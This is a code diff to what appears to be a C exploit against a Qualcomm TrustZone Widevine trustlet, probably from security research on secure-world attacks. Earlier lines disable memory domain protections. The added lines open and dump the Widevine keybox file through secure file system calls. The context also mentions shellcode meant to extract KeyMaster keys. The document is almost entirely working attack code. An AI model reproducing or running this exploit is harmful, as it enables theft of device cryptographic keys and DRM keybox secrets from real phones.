@@ -61,6 +61,34 @@ int main() {
     tzbsp_execute_function(wv_handle, app, TZBSP_SET_DACR, 1, 0xFFFFFFFF, 0, 0, 0, 0, 0, 0);
     printf("[+] Enabled all domain permissions\n");
 
+    //Allocating a buffer for the file path
+    char* file_path = "/persist/data/app_g/sfs/keybox_lvl1.dat";
+    uint32_t data_buffer_size = 0x100;
+    uint32_t path_buf = tz_malloc(wv_handle, app, strlen(file_path) + 1);
+    printf("[+] Allocated path buffer: %08X\n", path_buf);
+
+    //Writing the file path to the buffer
+    write_range(wv_handle, app, path_buf, file_path, strlen(file_path) + 1);
+    printf("[+] Wrote file path to buffer\n");
+
+    //Opening the file
+    uint32_t mfile = execute_function(wv_handle, app, (uint32_t)app + QSEE_SFS_OPEN_OFFSET, path_buf, 0, 0, 0);
+    printf("[+] Opened file: %08X\n", mfile);
+
+    //Allocating a buffer to which we'll read the file content
+    uint32_t data_buf = tz_malloc(wv_handle, app, data_buffer_size);
+    printf("[+] Allocated data buffer: %08X\n", data_buf);
+
+    //Reading the data from the file
+    uint32_t bytes_read = execute_function(wv_handle, app, (uint32_t)app + QSEE_SFS_READ_OFFSET, mfile, data_buf, data_buffer_size, 0);
+    printf("[+] Read %d bytes from file\n", bytes_read);
+
+    //Dumping the data read
+    printf("[+] Dumping the file:\n");
+    for (int i=0; i<bytes_read/sizeof(uint32_t); i++) {
+        printf("%08X\n", read_dword(wv_handle, app, data_buf + i*sizeof(uint32_t)));
+    }
+
     //Writing shellcode to extract both keys from the KeyMaster application!
     printf("[+] Writing shellcode to code cave\n");
     int fd = open("shellcode.bin", O_RDONLY);
